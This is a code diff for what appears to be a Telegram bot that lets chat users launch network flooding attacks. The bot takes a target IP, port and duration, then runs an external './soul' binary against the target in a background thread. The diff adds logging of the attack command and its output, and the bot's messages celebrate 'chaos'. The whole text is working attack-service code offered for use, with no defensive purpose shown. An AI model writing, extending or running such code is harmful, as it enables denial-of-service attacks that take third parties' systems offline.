@@ -56,6 +56,7 @@ def process_attack_command(message):
                                            f"*👉 Target Port: {target_port}*\n"
                                            f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')
 
+        # Start the attack in a separate thread to avoid blocking the bot
         attack_thread = Thread(target=run_attack, args=(target_ip, target_port, duration, message.chat.id))
         attack_thread.start()
 
@@ -64,21 +65,34 @@ def process_attack_command(message):
 
 def run_attack(target_ip, target_port, duration, chat_id):
     try:
+        # Log the command being executed with dynamic parameters
+        logging.info(f"Running attack with IP: {target_ip}, Port: {target_port}, Duration: {duration} seconds")
+
         # Set the CPU affinity to use only the first 8 cores (core 0 to 7)
         pid = os.getpid()
         os.sched_setaffinity(pid, range(8))  # Restrict to CPUs 0-7
 
-        # Prepare the attack command
+        # Prepare the attack command with dynamic IP, port, and duration
         attack_command = ['./soul', target_ip, str(target_port), str(duration)]
+
+        # Log the exact command being used for debugging
+        logging.info(f"Executing command: {' '.join(attack_command)}")
 
         # Start the attack
         process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
         bot.send_message(chat_id, "*💥 The attack is ongoing... 💥*\n*⏳ Duration remaining: {} seconds*".format(duration), parse_mode='Markdown')
 
-        # Wait for the process to complete
-        process.wait()
+        # Wait for the process to complete and capture the output
+        stdout, stderr = process.communicate()
 
+        # Log stdout and stderr for further debugging
+        if stdout:
+            logging.info(f"Attack stdout: {stdout.decode()}")
+        if stderr:
+            logging.error(f"Attack stderr: {stderr.decode()}")
+
+        # Notify user of attack completion
         bot.send_message(chat_id, "*🔥 The attack has been completed! 🛑*\n"
                                   "*💣 Duration completed, the chaos has ended!*")
 
